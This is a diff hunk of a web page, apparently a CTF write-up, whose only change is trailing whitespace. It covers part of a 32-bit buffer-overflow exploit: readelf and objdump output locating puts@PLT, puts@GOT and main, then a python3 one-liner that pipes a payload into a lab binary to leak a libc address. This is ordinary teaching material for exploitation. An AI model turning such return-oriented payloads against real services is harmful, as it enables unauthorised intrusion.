@@ -19,11 +19,11 @@
 0804a018  00000407 R_386_JUMP_SLOT   00000000   <span class="code-red">puts</span>@GLIBC_2.0  
 </code></pre></div><p>Finally, we need to set a returning address. Since we will need to send another payload, we must run the program again but without closing the process. Hence, the return instruction must be the address of <code>main</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">objdump</span> -d <span class="mtku">server</span> | <span class="code-dark-green">grep</span> main
 08048430 &lt;__libc_start_<span class="code-red">main</span>@plt&gt;:
- 804849d:       e8 8e ff ff ff          call   8048430 &lt;__libc_start_<span class="code-red">main</span>@plt&gt;  
+ 804849d:       e8 8e ff ff ff          call   8048430 &lt;__libc_start_<span class="code-red">main</span>@plt&gt;
 08048640 &lt;<span class="code-red">main</span>&gt;:
 
 <span class="code-cyan">$</span> <span class="code-dark-green">readelf</span> -s <span class="mtku">server</span> | <span class="code-dark-green">grep</span> main
-     7: 00000000     0 FUNC    GLOBAL DEFAULT  UND __libc_start_<span class="code-red">main</span>@GLIBC_2.0 (2)
+     7: 00000000     0 FUNC    GLOBAL DEFAULT  UND __libc_start_<span class="code-red">main</span>@GLIBC_2.0 (2)  
     61: 00000000     0 FUNC    GLOBAL DEFAULT  UND __libc_start_<span class="code-red">main</span>@@GLIBC_
     73: 08048640    90 FUNC    GLOBAL DEFAULT   14 <span class="code-red">main</span>
 </code></pre></div><p>Now that we have those values, we can send the payload. It will be made of 60 bytes of junk (taken from <a target="_blank" href="../rip-my-bof">RIP my bof</a>), the address of <code>puts</code> at PLT, the return address (<code>main</code>) and the argument for <code>puts</code> (which is the address of <code>puts</code> at GOT).</p><p>Let&rsquo;s try it:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> -c <span class="code-dark-yellow">'import os; os.write(1, b"A" * 60 + b"\x10\x84\x04\x08" + b"\x40\x86\x04\x08" + b"\x18\xa0\x04\x08")'</span> | <span class="code-dark-green">./server</span>  
